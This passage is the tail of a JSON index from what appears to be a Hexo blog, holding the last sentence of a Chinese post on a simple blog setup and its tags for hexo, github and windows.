这样就完成了简单的搭建。","categories":[],"tags":[{"name":"hexo","slug":"hexo","permalink":"qianfei11.coding.me/tags/hexo/"},{"name":"github","slug":"github","permalink":"qianfei11.coding.me/tags/github/"},{"name":"windows","slug":"windows","permalink":"qianfei11.coding.me/tags/windows/"}]}]}